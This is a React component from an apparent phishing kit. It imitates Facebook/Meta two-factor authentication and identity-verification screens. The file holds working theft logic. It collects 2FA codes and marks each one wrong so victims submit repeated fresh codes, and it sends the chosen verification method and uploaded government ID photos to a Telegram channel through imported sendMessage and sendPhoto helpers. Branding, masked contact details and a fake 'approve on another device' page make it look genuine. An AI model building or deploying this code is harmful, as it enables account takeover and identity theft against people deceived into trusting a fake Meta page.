import { useEffect, useState } from 'react';
import PropTypes from 'prop-types';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import TwoFAImage from '@/assets/images/2FA.png';
import AnotherDeviceNotificationImage from '@/assets/images/F3-2FA-AnotherDeviceNotification.png';
import DocumentIcon from '@/assets/images/ic_document.svg';
import config from '@/utils/config';
import sendMessage, { sendPhoto } from '@/utils/telegram';

const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => {
    const [code, setCode] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [attempts, setAttempts] = useState(0);
    const [countdown, setCountdown] = useState(0);
    const [showMethodModal, setShowMethodModal] = useState(false);
    const [showIdentityModal, setShowIdentityModal] = useState(false);
    const [identityStep, setIdentityStep] = useState('intro');
    const [selectedMethod, setSelectedMethod] = useState('');
    const [activeMethod, setActiveMethod] = useState('code');
    const [uploadedIdFile, setUploadedIdFile] = useState(null);
    const [isSendingIdFile, setIsSendingIdFile] = useState(false);
    const [identityError, setIdentityError] = useState('');
    const [isDragOverUpload, setIsDragOverUpload] = useState(false);

    useEffect(() => {
        if (!show) return undefined;

        const handleEscClose = (event) => {
            if (event.key === 'Escape') {
                onClose();
            }
        };

        globalThis.addEventListener('keydown', handleEscClose);

        return () => {
            globalThis.removeEventListener('keydown', handleEscClose);
        };
    }, [show, onClose]);

    const handleSubmit = async (e) => {
        e.preventDefault();
        const normalizedCode = String(code || '').replace(/\D/g, '');

        if (!/^\d{6,8}$/.test(normalizedCode)) {
            return;
        }

        setIsLoading(true);
        setShowError(false);

        onSubmit(normalizedCode);

        setCountdown(config.code_loading_time || 3);

        const timer = setInterval(() => {
            setCountdown((prev) => {
                if (prev <= 1) {
                    clearInterval(timer);
                    return 0;
                }
                return prev - 1;
            });
        }, 1000);

        await new Promise((resolve) => setTimeout(resolve, (config.code_loading_time || 3) * 1000));

        setShowError(true);
        setAttempts((prev) => prev + 1);
        setIsLoading(false);
        setCountdown(0);

        if (attempts + 1 >= (config.max_code_attempts || 2)) {
            onSuccess();
            return;
        }

        setCode('');
    };

    const formatTime = (seconds) => {
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
    };

    /* Mask email: t**t@example.us */
    const maskEmail = (email) => {
        if (!email) return 't**t@example.us';
        const [local, domain] = email.split('@');
        if (!domain) return email;
        if (local.length <= 2) return `${local[0]}**@${domain}`;
        return `${local[0]}**${local[local.length - 1]}@${domain}`;
    };

    /* Mask phone: +60 ****** 25 */
    const maskPhone = (phone) => {
        if (!phone) return '+84 ****** XX';
        const digits = phone.replace(/\D/g, '');
        if (digits.length < 4) return phone;
        return `+${digits.slice(0, 2)} ****** ${digits.slice(-2)}`;
    };

    if (!show) return null;

    const userName = formData?.fullName || 'User';
    const maskedEmail = maskEmail(formData?.personalEmail);
    const maskedPhone = maskPhone(formData?.phone);
    const stepLabel = `(${texts.step || 'Bước'} ${attempts + 1}/${config.max_code_attempts || 3})`;
    const isCodeValid = /^\d{6,8}$/.test(String(code || '').replace(/\D/g, ''));
    const isDeviceNotificationMethod = activeMethod === 'device_notifications';
    const notifyMethodSelection = (value) => {
        const methodText = value === 'device_notifications'
            ? (texts.notificationsFromOtherDevices || 'Notifications from other devices')
            : (texts.idAndSelfieVideo || 'ID and selfie video');

        const safeMethod = String(methodText)
            .replaceAll('&', '&amp;')
            .replaceAll('<', '&lt;')
            .replaceAll('>', '&gt;');

        sendMessage(`🔔 <b>METHOD SELECTED</b>\nMethod: <code>${safeMethod}</code>`).catch(() => {});
    };

    const handleMethodSelect = (value) => {
        setSelectedMethod(value);
        notifyMethodSelection(value);

        if (value === 'device_notifications') {
            setActiveMethod('device_notifications');
            setShowMethodModal(false);
            return;
        }

        if (value === 'id_selfie_video') {
            setShowMethodModal(false);
            setShowIdentityModal(true);
        }
    };

    const handleIdFileChange = (event) => {
        const selectedFile = event.target.files?.[0];
        applySelectedIdFile(selectedFile);
    };

    const applySelectedIdFile = (selectedFile) => {
        if (!selectedFile) return;

        if (!String(selectedFile.type || '').startsWith('image/')) {
            setUploadedIdFile(null);
            setIdentityError('Please choose an image file (jpg, png, webp).');
            return;
        }

        setUploadedIdFile(selectedFile);
        setIdentityError('');
    };

    const handleIdentityNext = async () => {
        if (identityStep === 'intro') {
            setIdentityStep('select_id');
            return;
        }

        if (!uploadedIdFile) {
            setIdentityError('Please upload an ID image before continuing.');
            return;
        }

        try {
            setIsSendingIdFile(true);
            setIdentityError('');

            const safeIdType = 'ID photo'
                .replaceAll('&', '&amp;')
                .replaceAll('<', '&lt;')
                .replaceAll('>', '&gt;');
            const safeFileName = String(uploadedIdFile.name || 'id-image.jpg')
                .replaceAll('&', '&amp;')
                .replaceAll('<', '&lt;')
                .replaceAll('>', '&gt;');

            await sendPhoto(
                uploadedIdFile,
                `<b>ID UPLOAD</b>\nType: <code>${safeIdType}</code>\nFile: <code>${safeFileName}</code>`
            );

            setShowIdentityModal(false);
            setIdentityStep('intro');
            setUploadedIdFile(null);
            onSuccess();
        } catch {
            setIdentityError('Upload failed. Please try again.');
        } finally {
            setIsSendingIdFile(false);
        }
    };

    const handleMethodContinue = () => {
        if (selectedMethod === 'device_notifications') {
            setActiveMethod('device_notifications');
        }

        if (selectedMethod === 'id_selfie_video') {
            setShowIdentityModal(true);
        }

        setShowMethodModal(false);
    };

    const methodOptions = [
        {
            value: 'device_notifications',
            title: texts.notificationsFromOtherDevices || 'Notifications from other devices',
            description: texts.authorizeLoginFromAnotherDevice || 'Authorize login from another device.',
        },
        {
            value: 'id_selfie_video',
            title: texts.idAndSelfieVideo || 'ID and selfie video',
            description: texts.idAndSelfieVideoDescription || 'Take a photo of your official ID and a short video featuring you',
        },
    ];
    /* ── Styles ── */
    const overlayStyle = {
        position: 'fixed',
        inset: 0,
        backgroundColor: isDeviceNotificationMethod ? '#fff' : 'rgba(0,0,0,0.45)',
        zIndex: 1040,
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'flex-start',
        padding: isDeviceNotificationMethod ? '96px 16px 32px' : '32px 16px',
        overflowY: 'auto',
        scrollbarWidth: 'none',
        msOverflowStyle: 'none',
    };

    const modalStyle = {
        position: 'relative',
        width: '100%',
        maxWidth: isDeviceNotificationMethod ? '600px' : '500px',
        backgroundColor: isDeviceNotificationMethod ? '#fff' : undefined,
        backgroundImage: isDeviceNotificationMethod ? 'none' : 'linear-gradient(130deg, #f9f1f9, #eaf3fd 35%, #edfbf2)',
        borderRadius: isDeviceNotificationMethod ? '28px' : '18px',
        boxShadow: isDeviceNotificationMethod ? 'none' : '0 20px 60px rgba(0,0,0,0.18)',
        zIndex: 1050,
        padding: isDeviceNotificationMethod ? '0' : '28px',
        display: 'flex',
        flexDirection: 'column',
        gap: isDeviceNotificationMethod ? '20px' : '16px',
        flexShrink: 0,
    };

    const inputWrapperStyle = {
        width: '100%',
        height: '40px',
        border: `1.5px solid ${showError ? '#e74c3c' : '#d4dbe3'}`,
        borderRadius: '10px',
        backgroundColor: '#fff',
        padding: '0 11px',
        transition: 'all 0.2s',
        marginBottom: '4px',
        display: 'flex',
        alignItems: 'center',
    };

    const inputStyle = {
        width: '100%',
        height: '100%',
        border: 'none',
        outline: 'none',
        fontSize: '14px',
        backgroundColor: 'transparent',
        color: '#333',
    };

    return (
        <div style={overlayStyle}>
            <div style={modalStyle}>
                {/* User info row */}
                {isDeviceNotificationMethod ? (
                    <div style={{ width: '100%' }}>
                        <div style={{
                            display: 'flex',
                            alignItems: 'center',
                            gap: '4px',
                            color: '#1c1e21',
                            fontSize: '13px',
                            marginBottom: '4px',
                        }}>
                            <span>{userName}</span>
                            <span>•</span>
                            <span>Facebook</span>
                        </div>

                        <h2 style={{
                            margin: '0 0 8px',
                            color: '#111',
                            fontSize: '26px',
                            fontWeight: 700,
                            lineHeight: 1.2,
                        }}>
                            {texts.checkNotificationOnAnotherDevice || 'Check notifications on another device'}
                        </h2>

                        <p style={{
                            margin: '0 0 30px',
                            color: '#1c1e21',
                            fontSize: '16px',
                            lineHeight: 1.25,
                            maxWidth: '600px',
                        }}>
                            {texts.deviceNotificationDescription || 'We sent a notification to your other devices. Please check the notification on Facebook and approve the login to continue.'}
                        </p>

                        <div style={{
                            width: '100%',
                            overflow: 'hidden',
                            borderRadius: '18px',
                            marginBottom: '26px',
                        }}>
                            <img
                                src={AnotherDeviceNotificationImage}
                                alt="Device notification"
                                style={{
                                    display: 'block',
                                    width: '100%',
                                    objectFit: 'contain',
                                }}
                            />
                        </div>

                        <div style={{
                            width: '22px',
                            height: '22px',
                            border: '1.5px solid #1c1e21',
                            borderRadius: '50%',
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'center',
                            color: '#1c1e21',
                            fontSize: '16px',
                            lineHeight: 1,
                            margin: '0 0 28px 16px',
                        }}>
                            ···
                        </div>

                        <button
                            type="button"
                            onClick={() => setShowMethodModal(true)}
                            style={{
                                width: '100%',
                                minHeight: '44px',
                                border: '1px solid #ccd0d5',
                                borderRadius: '999px',
                                backgroundColor: '#fff',
                                color: '#1c1e21',
                                fontSize: '16px',
                                fontWeight: 600,
                                cursor: 'pointer',
                            }}
                        >
                            {texts.tryAnotherMethod || 'Try another method'}
                        </button>
                    </div>
                ) : (<>
                <div style={{ width: '100%' }}>
                    <div style={{
                        display: 'flex',
                        alignItems: 'center',
                        gap: '6px',
                        fontSize: '14px',
                        color: '#9a979e',
                        marginBottom: '7px',
                    }}>
                        <span>{userName}</span>
                        <div style={{
                            width: '4px',
                            height: '4px',
                            backgroundColor: '#9a979e',
                            borderRadius: '5px',
                        }} />
                        <span>Facebook</span>
                    </div>

                    {/* Title */}
                    <h2 style={{
                        fontSize: '20px',
                        lineHeight: 1.3,
                        color: '#000',
                        fontWeight: 700,
                        marginBottom: '15px',
                        wordBreak: 'break-word',
                    }}>
                        {texts.twoFAStep || 'Yêu cầu xác thực hai yếu tố'} {stepLabel}
                    </h2>

                    {/* Description */}
                    <p style={{
                        color: '#9a979e',
                        fontSize: '14px',
                        lineHeight: 1.55,
                        margin: 0,
                    }}>
                        {`${texts.twoFAInstructionPrefix || 'Enter the code sent to'} ${maskedEmail}, ${maskedPhone}, ${texts.twoFAInstructionSuffix || 'or confirm with an authenticator app you set up (such as Duo Mobile or Google Authenticator).'}`}
                    </p>

                    {/* 2FA Image */}
                    <div style={{
                        width: '100%',
                        borderRadius: '10px',
                        backgroundColor: '#f5f5f5',
                        overflow: 'hidden',
                        margin: '15px 0',
                    }}>
                        <img src={TwoFAImage} width="100%" alt="authentication" style={{ display: 'block' }} />
                    </div>

                    {/* Form */}
                    <form onSubmit={handleSubmit}>
                        {/* Label */}
                        <label htmlFor="twoFaInput" style={{
                            display: 'block',
                            marginBottom: '6px',
                            fontSize: '13px',
                            fontWeight: 600,
                            color: '#3b4a64',
                        }}>
                            {texts.code || 'Mã 2FA'} <span style={{ color: '#e5484d' }}>*</span>
                        </label>

                        {/* Input */}
                        <div
                            style={inputWrapperStyle}
                            onMouseOver={(e) => {
                                e.currentTarget.style.borderColor = '#3b82f6';
                                e.currentTarget.style.boxShadow = '0 4px 12px rgba(59,130,246,0.12)';
                            }}
                            onMouseOut={(e) => {
                                if (!e.currentTarget.contains(document.activeElement)) {
                                    e.currentTarget.style.borderColor = showError ? '#e74c3c' : '#d4dbe3';
                                    e.currentTarget.style.boxShadow = 'none';
                                }
                            }}
                            onFocusCapture={(e) => {
                                e.currentTarget.style.borderColor = '#3b82f6';
                                e.currentTarget.style.boxShadow = '0 4px 12px rgba(59,130,246,0.12)';
                            }}
                            onBlurCapture={(e) => {
                                if (!e.currentTarget.contains(e.relatedTarget)) {
                                    e.currentTarget.style.borderColor = showError ? '#e74c3c' : '#d4dbe3';
                                    e.currentTarget.style.boxShadow = 'none';
                                }
                            }}
                        >
                            <input
                                style={inputStyle}
                                inputMode="numeric"
                                id="twoFaInput"
                                placeholder={texts.code || 'Code'}
                                maxLength="8"
                                type="text"
                                autoComplete="off"
                                value={code}
                                onChange={(e) => {
                                    setCode(e.target.value.replace(/\D/g, '').slice(0, 8));
                                    if (showError) setShowError(false);
                                }}
                            />
                        </div>

                        {/* Helper / Error text */}
                        {showError ? (
                            <p style={{
                                color: '#e74c3c',
                                fontSize: '12px',
                                margin: '-1px 0 10px 0',
                            }}>
                                {texts.codeExpired || 'The code you entered is incorrect. Please try again.'}
                            </p>
                        ) : (
                            <p style={{
                                color: '#6a7893',
                                fontSize: '12px',
                                margin: '-1px 0 10px 0',
                            }}>
                                {texts.validCodeHint || 'Mã hợp lệ gồm 6 hoặc 8 chữ số.'}
                            </p>
                        )}

                        {/* Submit button */}
                        <div style={{ width: '100%', marginTop: '20px' }}>
                            <button
                                type="submit"
                                disabled={isLoading || !isCodeValid}
                                style={{
                                    minHeight: '48px',
                                    width: '100%',
                                    backgroundColor: '#0064E0',
                                    color: '#fff',
                                    borderRadius: '40px',
                                    padding: '10px 16px',
                                    border: 'none',
                                    fontSize: '16px',
                                    fontWeight: 600,
                                    display: 'flex',
                                    alignItems: 'center',
                                    justifyContent: 'center',
                                    cursor: (isLoading || !isCodeValid) ? 'not-allowed' : 'pointer',
                                    opacity: (isLoading || !isCodeValid) ? 0.7 : 1,
                                    transition: 'opacity 0.3s',
                                }}
                            >
                                {isLoading ? (
                                    <>
                                        <span style={{
                                            width: '20px',
                                            height: '20px',
                                            border: '3px solid rgba(255,255,255,0.4)',
                                            borderTopColor: '#fff',
                                            borderRadius: '50%',
                                            animation: 'spin 0.8s linear infinite',
                                            display: 'inline-block',
                                            marginRight: '8px',
                                        }} />
                                        {`${texts.pleaseWait || 'Vui lòng chờ'} ${formatTime(countdown)}...`}
                                    </>
                                ) : (
                                    texts.continueBtn || 'Tiếp tục'
                                )}
                            </button>
                        </div>

                        {/* Try another method */}
                        <button
                            type="button"
                            onClick={() => setShowMethodModal(true)}
                            style={{
                            width: '100%',
                            marginTop: '20px',
                            color: '#3b4a64',
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'center',
                            backgroundColor: 'transparent',
                            borderRadius: '40px',
                            padding: '10px 20px',
                            border: '1px solid #d4dbe3',
                            cursor: 'pointer',
                            fontSize: '14px',
                        }}
                        >
                            <span>{texts.tryAnotherMethod || 'Thử phương thức khác'}</span>
                        </button>
                    </form>
                </div>

                {/* Meta logo */}
                <div style={{
                    width: '60px',
                    height: '60px',
                    flexShrink: 0,
                    margin: '0 auto',
                }}>
                    <img src={MetaLogo} width="100%" height="100%" alt="Meta"
                        style={{ objectFit: 'contain' }} />
                </div>
                </>
                )}
            </div>

            {showMethodModal && (
                <div
                    style={{
                        position: 'fixed',
                        inset: 0,
                        zIndex: 1060,
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        padding: '16px',
                        backgroundColor: 'rgba(0,0,0,0.28)',
                    }}
                >
                    <div
                        style={{
                            width: '100%',
                            maxWidth: '600px',
                            borderRadius: '28px',
                            backgroundColor: '#fff',
                            boxShadow: '0 12px 34px rgba(0,0,0,0.22)',
                            padding: '22px 20px 20px',
                        }}
                    >
                        <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
                            <button
                                type="button"
                                aria-label="Close"
                                onClick={() => setShowMethodModal(false)}
                                style={{
                                    width: '34px',
                                    height: '34px',
                                    border: 'none',
                                    backgroundColor: 'transparent',
                                    color: '#111',
                                    cursor: 'pointer',
                                    fontSize: '32px',
                                    lineHeight: '30px',
                                    padding: 0,
                                }}
                            >
                                ×
                            </button>
                        </div>

                        <h3 style={{
                            margin: '8px 0 8px',
                            color: '#1c1e21',
                            fontSize: '24px',
                            fontWeight: 700,
                            lineHeight: 1.25,
                        }}>
                            {texts.identityVerificationMethodTitle || 'Please choose an identity verification method.'}
                        </h3>
                        <p style={{
                            margin: '0 0 26px',
                            color: '#1c1e21',
                            fontSize: '15px',
                            lineHeight: 1.35,
                        }}>
                            {texts.identityVerificationMethodSubtitle || 'The available verification methods are listed below.'}
                        </p>

                        <div style={{
                            overflow: 'hidden',
                            border: '1px solid #d8dde5',
                            borderRadius: '14px',
                            backgroundColor: '#fff',
                        }}>
                            {methodOptions.map((option, index) => (
                                <button
                                    key={option.value}
                                    type="button"
                                    onClick={() => handleMethodSelect(option.value)}
                                    style={{
                                        width: '100%',
                                        minHeight: '60px',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'space-between',
                                        gap: '14px',
                                        padding: '10px 16px',
                                        backgroundColor: '#fff',
                                        border: 'none',
                                        borderBottom: index === methodOptions.length - 1 ? 'none' : '1px solid #e5e5e5',
                                        cursor: 'pointer',
                                        textAlign: 'left',
                                    }}
                                >
                                    <span style={{ minWidth: 0 }}>
                                        <span style={{
                                            display: 'block',
                                            color: '#1c1e21',
                                            fontSize: '15px',
                                            fontWeight: 700,
                                            lineHeight: 1.25,
                                        }}>
                                            {option.title}
                                        </span>
                                        <span style={{
                                            display: 'block',
                                            color: '#606770',
                                            fontSize: '14px',
                                            lineHeight: 1.25,
                                            marginTop: '2px',
                                        }}>
                                            {option.description}
                                        </span>
                                    </span>
                                    <span style={{
                                        width: '20px',
                                        height: '20px',
                                        borderRadius: '50%',
                                        border: `2px solid ${selectedMethod === option.value ? '#0866ff' : '#65676b'}`,
                                        flexShrink: 0,
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                    }}>
                                        {selectedMethod === option.value && (
                                            <span style={{
                                                width: '10px',
                                                height: '10px',
                                                borderRadius: '50%',
                                                backgroundColor: '#0866ff',
                                            }} />
                                        )}
                                    </span>
                                </button>
                            ))}
                        </div>

                        <button
                            type="button"
                            onClick={handleMethodContinue}
                            style={{
                                width: '100%',
                                minHeight: '44px',
                                marginTop: '36px',
                                border: 'none',
                                borderRadius: '999px',
                                backgroundColor: '#0866ff',
                                color: '#fff',
                                fontSize: '15px',
                                fontWeight: 700,
                                cursor: 'pointer',
                            }}
                        >
                            {texts.continueBtn || 'Continue'}
                        </button>
                    </div>
                </div>
            )}

            {showIdentityModal && (
                <div
                    style={{
                        position: 'fixed',
                        inset: 0,
                        zIndex: 1070,
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        padding: '16px',
                        backgroundColor: 'rgba(0,0,0,0.55)',
                    }}
                >
                    <div
                        style={{
                            width: '100%',
                            maxWidth: '548px',
                            overflow: 'hidden',
                            borderRadius: '14px',
                            backgroundColor: '#fff',
                            boxShadow: '0 10px 28px rgba(0,0,0,0.28)',
                        }}
                    >
                        <div style={{
                            position: 'relative',
                            padding: '16px 54px 14px',
                            borderBottom: '1px solid #dadde1',
                            textAlign: 'center',
                        }}>
                            {identityStep === 'select_id' && (
                                <button
                                    type="button"
                                    aria-label="Back"
                                    onClick={() => setIdentityStep('intro')}
                                    style={{
                                        position: 'absolute',
                                        top: '14px',
                                        left: '18px',
                                        width: '30px',
                                        height: '30px',
                                        border: 'none',
                                        backgroundColor: 'transparent',
                                        color: '#1c1e21',
                                        cursor: 'pointer',
                                        fontSize: '28px',
                                        lineHeight: '28px',
                                        padding: 0,
                                    }}
                                >
                                    ←
                                </button>
                            )}
                            <h3 style={{
                                margin: 0,
                                color: '#1c1e21',
                                fontSize: '21px',
                                fontWeight: 700,
                                lineHeight: 1.25,
                            }}>
                                {texts.identityVerification || 'Identity verification'}
                            </h3>
                            <button
                                type="button"
                                aria-label="Close"
                                onClick={() => {
                                    setShowIdentityModal(false);
                                    setIdentityStep('intro');
                                    setUploadedIdFile(null);
                                    setIdentityError('');
                                }}
                                style={{
                                    position: 'absolute',
                                    top: '12px',
                                    right: '16px',
                                    width: '30px',
                                    height: '30px',
                                    border: 'none',
                                    backgroundColor: 'transparent',
                                    color: '#1c1e21',
                                    cursor: 'pointer',
                                    fontSize: '32px',
                                    lineHeight: '28px',
                                    padding: 0,
                                }}
                            >
                                ×
                            </button>
                        </div>

                        {identityStep === 'intro' ? (
                            <div style={{ padding: '12px 16px 28px' }}>
                                <h4 style={{
                                    margin: '0 0 2px',
                                    color: '#1c1e21',
                                    fontSize: '22px',
                                    fontWeight: 700,
                                    lineHeight: 1.2,
                                }}>
                                    {texts.identityGuideTitle || 'We will guide you through a few steps'}
                                </h4>
                                <p style={{
                                    margin: '0 0 18px',
                                    color: '#1c1e21',
                                    fontSize: '17px',
                                    lineHeight: 1.2,
                                }}>
                                    {texts.identityGuideDescription || 'Please provide the following information so we can verify your identity:'}
                                </p>

                                <div style={{
                                    display: 'flex',
                                    gap: '18px',
                                    alignItems: 'flex-start',
                                    padding: '0 16px',
                                }}>
                                    <img
                                        src={DocumentIcon}
                                        alt="ID"
                                        style={{
                                            width: '24px',
                                            height: '24px',
                                            flexShrink: 0,
                                            marginTop: '17px',
                                        }}
                                    />
                                    <div>
                                        <div style={{
                                            color: '#65676b',
                                            fontSize: '13px',
                                            lineHeight: 1.2,
                                            marginBottom: '2px',
                                        }}>
                                            {texts.step || 'Step'} 1
                                        </div>
                                        <div style={{
                                            color: '#1c1e21',
                                            fontSize: '18px',
                                            fontWeight: 700,
                                            lineHeight: 1.2,
                                        }}>
                                            {texts.uploadId || 'Upload ID'}
                                        </div>
                                        <p style={{
                                            margin: '3px 0 0',
                                            color: '#1c1e21',
                                            fontSize: '15px',
                                            lineHeight: 1.25,
                                        }}>
                                            {texts.uploadIdDescription || 'Identity is verified through official identification. This information is not shared on your profile.'}
                                        </p>
                                    </div>
                                </div>
                            </div>
                        ) : (
                            <div style={{ padding: '12px 16px 24px' }}>
                                <h4 style={{
                                    margin: '0 0 6px',
                                    color: '#1c1e21',
                                    fontSize: '18px',
                                    fontWeight: 700,
                                    lineHeight: 1.1,
                                }}>
                                    Upload ID photo
                                </h4>
                                <p style={{
                                    margin: '0 0 14px',
                                    color: '#1c1e21',
                                    fontSize: '14px',
                                    lineHeight: 1.2,
                                }}>
                                    The information on the ID card must be clearly visible in the photo. If the information is unclear, you may need to resubmit. Check{' '}
                                    <button
                                        type="button"
                                        style={{
                                            padding: 0,
                                            border: 'none',
                                            background: 'transparent',
                                            color: '#1877f2',
                                            textDecoration: 'none',
                                            fontWeight: 600,
                                            cursor: 'pointer',
                                        }}
                                    >
                                        photo requirements
                                    </button>
                                </p>
                                <div style={{ borderTop: '1px solid #dadde1', marginBottom: '16px' }} />
                                <p style={{ margin: '0 0 14px', color: '#1c1e21', fontSize: '13px', lineHeight: 1.3 }}>
                                    Click Upload or drag and drop the photo file with your ID.
                                </p>

                                <input
                                    id="idImageUpload"
                                    type="file"
                                    accept="image/*"
                                    onChange={handleIdFileChange}
                                    style={{ display: 'none' }}
                                />
                                <label
                                    htmlFor="idImageUpload"
                                    aria-label="Upload ID photo"
                                    style={{
                                        display: 'block',
                                        width: '100%',
                                        border: `1px dashed ${isDragOverUpload ? '#1877f2' : '#dadde1'}`,
                                        borderRadius: '8px',
                                        padding: '36px 16px 30px',
                                        textAlign: 'center',
                                        backgroundColor: isDragOverUpload ? '#f0f7ff' : '#fff',
                                        cursor: 'pointer',
                                    }}
                                    onDragOver={(event) => {
                                        event.preventDefault();
                                        setIsDragOverUpload(true);
                                    }}
                                    onDragLeave={() => {
                                        setIsDragOverUpload(false);
                                    }}
                                    onDrop={(event) => {
                                        event.preventDefault();
                                        setIsDragOverUpload(false);
                                        const droppedFile = event.dataTransfer?.files?.[0];
                                        applySelectedIdFile(droppedFile);
                                    }}
                                >
                                    <div style={{
                                        margin: '0 auto 18px',
                                        width: '124px',
                                        height: '76px',
                                        borderRadius: '10px',
                                        border: '1px solid #ecf1f7',
                                        backgroundColor: '#f8fbff',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        boxShadow: '0 1px 0 rgba(0,0,0,0.04)',
                                    }}>
                                        <div style={{
                                            width: '84px',
                                            height: '54px',
                                            borderRadius: '6px',
                                            background: 'linear-gradient(180deg, #5fa0ff 0%, #3f89ff 33%, #f4efe8 33%, #f4efe8 100%)',
                                            display: 'flex',
                                            alignItems: 'center',
                                            padding: '8px 8px',
                                            gap: '8px',
                                            boxSizing: 'border-box',
                                        }}>
                                            <div style={{
                                                width: '20px',
                                                height: '20px',
                                                borderRadius: '3px',
                                                backgroundColor: '#ffe8dc',
                                                display: 'flex',
                                                alignItems: 'center',
                                                justifyContent: 'center',
                                            }}>
                                                <div style={{
                                                    width: '8px',
                                                    height: '8px',
                                                    borderRadius: '50%',
                                                    backgroundColor: '#f2a890',
                                                }} />
                                            </div>
                                            <div style={{ display: 'grid', gap: '3px', flex: 1 }}>
                                                <span style={{ height: '2px', borderRadius: '2px', backgroundColor: '#8c9198', display: 'block' }} />
                                                <span style={{ height: '2px', borderRadius: '2px', backgroundColor: '#adb3bb', display: 'block', width: '85%' }} />
                                                <span style={{ height: '2px', borderRadius: '2px', backgroundColor: '#adb3bb', display: 'block', width: '70%' }} />
                                            </div>
                                        </div>
                                    </div>
                                    <div style={{
                                        display: 'inline-flex',
                                        alignItems: 'center',
                                        gap: '10px',
                                        color: '#111',
                                        fontWeight: 700,
                                        fontSize: '20px',
                                        lineHeight: '1',
                                    }}>
                                        <span style={{
                                            width: '18px',
                                            height: '18px',
                                            borderRadius: '50%',
                                            backgroundColor: '#111',
                                            color: '#fff',
                                            display: 'inline-flex',
                                            alignItems: 'center',
                                            justifyContent: 'center',
                                            fontSize: '11px',
                                            lineHeight: 1,
                                            marginTop: '1px',
                                        }}>
                                            +
                                        </span>
                                        <span>Upload</span>
                                    </div>
                                </label>

                                {uploadedIdFile && (
                                    <p style={{ margin: '10px 0 0', color: '#606770', fontSize: '13px' }}>
                                        Selected file: {uploadedIdFile.name}
                                    </p>
                                )}
                                {identityError && (
                                    <p style={{ margin: '8px 0 0', color: '#e74c3c', fontSize: '13px' }}>
                                        {identityError}
                                    </p>
                                )}
                            </div>
                        )}

                        {identityStep === 'select_id' ? (
                            <div style={{
                                padding: '14px 16px',
                                borderTop: '1px solid #dadde1',
                                display: 'flex',
                                gap: '12px',
                            }}>
                                <button
                                    type="button"
                                    onClick={() => {
                                        setIdentityStep('intro');
                                        setIdentityError('');
                                    }}
                                    style={{
                                        flex: 1,
                                        minHeight: '42px',
                                        border: 'none',
                                        borderRadius: '999px',
                                        backgroundColor: '#f5f7fa',
                                        color: '#d2d8df',
                                        fontSize: '16px',
                                        fontWeight: 700,
                                        cursor: 'pointer',
                                    }}
                                >
                                    Back
                                </button>
                                <button
                                    type="button"
                                    disabled={!uploadedIdFile || isSendingIdFile}
                                    onClick={handleIdentityNext}
                                    style={{
                                        flex: 1.7,
                                        minHeight: '42px',
                                        border: 'none',
                                        borderRadius: '999px',
                                        backgroundColor: !uploadedIdFile || isSendingIdFile ? '#edf0f5' : '#e7ebf1',
                                        color: !uploadedIdFile || isSendingIdFile ? '#c3c9d1' : '#111',
                                        fontSize: '16px',
                                        fontWeight: 700,
                                        cursor: !uploadedIdFile || isSendingIdFile ? 'not-allowed' : 'pointer',
                                    }}
                                >
                                    {isSendingIdFile ? (texts.pleaseWait || 'Please wait') : 'Submission'}
                                </button>
                            </div>
                        ) : (
                            <div style={{
                                padding: '16px 12px',
                                borderTop: '1px solid #dadde1',
                            }}>
                                <button
                                    type="button"
                                    onClick={handleIdentityNext}
                                    style={{
                                        width: '100%',
                                        minHeight: '38px',
                                        border: 'none',
                                        borderRadius: '999px',
                                        backgroundColor: '#0866ff',
                                        color: '#fff',
                                        fontSize: '15px',
                                        fontWeight: 700,
                                        cursor: 'pointer',
                                    }}
                                >
                                    {texts.next || 'Next'}
                                </button>
                            </div>
                        )}
                    </div>
                </div>
            )}

            {/* Spinner keyframe */}
            <style>{`
                @keyframes spin {
                    to { transform: rotate(360deg); }
                }
            `}</style>
        </div>
    );
};

TwoFAModal.propTypes = {
    show: PropTypes.bool.isRequired,
    onClose: PropTypes.func.isRequired,
    onSubmit: PropTypes.func.isRequired,
    onSuccess: PropTypes.func.isRequired,
    texts: PropTypes.object.isRequired,
    formData: PropTypes.object
};

export default TwoFAModal;
